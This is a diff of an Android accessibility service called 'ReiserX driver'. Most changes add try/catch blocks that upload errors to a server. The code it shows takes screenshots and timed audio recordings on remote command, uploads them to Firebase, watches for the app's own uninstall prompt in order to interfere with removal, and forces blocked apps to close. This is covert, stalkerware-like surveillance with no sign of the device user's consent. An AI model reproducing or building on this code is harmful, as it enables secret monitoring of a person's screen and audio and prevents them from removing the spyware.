@@ -60,6 +60,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
+        try {
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
@@ -71,78 +72,87 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
 
         sendNotification(this, "ReiserX driver", "Accessibility service is running", 10);
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
+        }
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
+        try {
 
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.reiserx.testtrace")) {
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.reiserx.testtrace")) {
 
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                Log.d(TAG, "Recieved event");
-                Parcelable data = accessibilityEvent.getParcelableData();
-                if (data instanceof Notification) {
-                    Log.d(TAG, "Recieved notification");
-                    Notification notification = (Notification) data;
+                if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+                    Log.d(TAG, "Recieved event");
+                    Parcelable data = accessibilityEvent.getParcelableData();
+                    if (data instanceof Notification) {
+                        Log.d(TAG, "Recieved notification");
+                        Notification notification = (Notification) data;
 
-                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
+                        if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
 
-                        String title = notification.extras.getString("android.title");
-                        if (title.contains("com.reiserx.testtrace.accessibility")) {
-                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-                            String UserID = save.getString("UserID", "");
+                            String title = notification.extras.getString("android.title");
+                            if (title.contains("com.reiserx.testtrace.accessibility")) {
+                                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                                String UserID = save.getString("UserID", "");
 
-                            int message = Integer.parseInt(notification.extras.getString("android.text"));
-                            switch (message) {
-                                case 1:
-                                    takeScreenshots(UserID);
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
-                                case 2:
-                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
-                                    final Handler handler = new Handler(Looper.getMainLooper());
-                                    startRecording();
-                                    handler.postDelayed(() -> stopRecording(UserID), value);
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
-                                case 3:
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
+                                int message = Integer.parseInt(notification.extras.getString("android.text"));
+                                switch (message) {
+                                    case 1:
+                                        takeScreenshots(UserID);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 2:
+                                        long value = Long.parseLong(title.replaceAll("[\\D]", ""));
+                                        final Handler handler = new Handler(Looper.getMainLooper());
+                                        startRecording();
+                                        handler.postDelayed(() -> stopRecording(UserID), value);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 3:
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                }
                             }
                         }
                     }
                 }
             }
-        }
 
 
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
-            if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
-                Log.d(TAG, "back");
-                instance = this;
-            } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
-                Log.d(TAG, "home");
-                instance = this;
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
+                if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
+                    Log.d(TAG, "back");
+                    instance = this;
+                } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
+                    Log.d(TAG, "home");
+                    instance = this;
+                }
             }
-        }
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
-                name = null;
-                action = null;
-                logNodeHeirarchy(getRootInActiveWindow(), 0);
-                if (name != null && action != null) {
-                    if (name.equals("ReiserX driver") && action.equals("Do you want to uninstall this app?")) {
-                        uninstalls();
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
+                if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
+                    name = null;
+                    action = null;
+                    logNodeHeirarchy(getRootInActiveWindow(), 0);
+                    if (name != null && action != null) {
+                        if (name.equals("ReiserX driver") && action.equals("Do you want to uninstall this app?")) {
+                            uninstalls();
+                        }
                     }
                 }
             }
-        }
 
-        disableApps();
+            disableApps();
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
+        }
     }
 
     public void uninstalls() {
@@ -187,66 +197,76 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     @Override
     protected boolean onKeyEvent(KeyEvent event) {
-        int action = event.getAction();
-        int keyCode = event.getKeyCode();
+        try {
+            int action = event.getAction();
+            int keyCode = event.getKeyCode();
 
-        if (action == KeyEvent.ACTION_UP) {
-            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
-                Log.d(TAG, "KeyUp");
-                instance = this;
-                updateAccessibility();
-            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
-                Log.d(TAG, "KeyDown");
-                instance = this;
-                updateAccessibility();
+            if (action == KeyEvent.ACTION_UP) {
+                if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
+                    Log.d(TAG, "KeyUp");
+                    instance = this;
+                    updateAccessibility();
+                } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
+                    Log.d(TAG, "KeyDown");
+                    instance = this;
+                    updateAccessibility();
+                }
             }
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
         }
         return super.onKeyEvent(event);
     }
 
 
     public void takeScreenshots(String UserID) {
+        try {
 
-        mdb = FirebaseDatabase.getInstance();
-        reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");
+            mdb = FirebaseDatabase.getInstance();
+            reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");
 
-        taskSuccess = new TaskSuccess("Capturing screenshot", true, false);
-        reference.setValue(taskSuccess);
+            taskSuccess = new TaskSuccess("Capturing screenshot", true, false);
+            reference.setValue(taskSuccess);
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            takeScreenshot(Display.DEFAULT_DISPLAY,
-                    getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
-                        @Override
-                        public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                takeScreenshot(Display.DEFAULT_DISPLAY,
+                        getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
+                            @Override
+                            public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
 
-                            taskSuccess.setMessage("Screenshot captured");
-                            taskSuccess.setSuccess(true);
-                            reference.setValue(taskSuccess);
-                            Log.i(TAG, "onSuccess");
-                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
+                                taskSuccess.setMessage("Screenshot captured");
+                                taskSuccess.setSuccess(true);
+                                reference.setValue(taskSuccess);
+                                Log.i(TAG, "onSuccess");
+                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
 
-                            saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.this, reference, taskSuccess);
-                            String filename = getRandom.getRandom(0, 1000000000) + ".png";
-                            saveBitmap.saveData(filename, UserID);
-                        }
+                                saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.this, reference, taskSuccess);
+                                String filename = getRandom.getRandom(0, 1000000000) + ".png";
+                                saveBitmap.saveData(filename, UserID);
+                            }
 
-                        @Override
-                        public void onFailure(int i) {
+                            @Override
+                            public void onFailure(int i) {
 
-                            taskSuccess.setMessage("Capture failed " + i);
-                            taskSuccess.setSuccess(false);
-                            taskSuccess.setFinal(true);
-                            reference.setValue(taskSuccess);
-                            Log.i(TAG, "onFailure code is " + i);
+                                taskSuccess.setMessage("Capture failed " + i);
+                                taskSuccess.setSuccess(false);
+                                taskSuccess.setFinal(true);
+                                reference.setValue(taskSuccess);
+                                Log.i(TAG, "onFailure code is " + i);
 
-                        }
-                    });
-        } else {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
-                ScreenshotObserver screenshotObserver = new ScreenshotObserver();
-                screenshotObserver.Observer(UserID, taskSuccess, reference);
+                            }
+                        });
+            } else {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
+                    ScreenshotObserver screenshotObserver = new ScreenshotObserver();
+                    screenshotObserver.Observer(UserID, taskSuccess, reference);
+                }
             }
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
         }
     }
 
@@ -292,6 +312,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     }
 
     public void updateAudioToServer(String UserID, File filePath) {
+        try {
         FirebaseStorage storage = FirebaseStorage.getInstance();
         FirebaseFirestore firestore = FirebaseFirestore.getInstance();
 
@@ -311,16 +332,26 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                 });
             }
         });
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
+        }
     }
 
     private void updateAccessibility() {
+        try {
         SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
         String UserID = save.getString("UserID", "");
         String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
         FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
+        }
     }
 
     public void sendNotification(Context context, String title, String content, int id) {
+        try {
 
         SharedPreferences flag = context.getSharedPreferences("Flags", MODE_PRIVATE);
 
@@ -351,14 +382,23 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
             // Notification ID cannot be 0.
             startForeground(id, notify_bulder.getNotification());
         }
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
+        }
     }
 
     void disableApps() {
+        try {
         SharedPreferences save = getSharedPreferences("blocked", MODE_PRIVATE);
         getCurrentTask getCurrentTask = new getCurrentTask(this);
         if (save.getString(getCurrentTask.getPackage(), "").equals("1")) {
             performGlobalAction(GLOBAL_ACTION_BACK);
             performGlobalAction(GLOBAL_ACTION_HOME);
+        }
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
+            exceptionHandler.upload();
         }
     }
 }
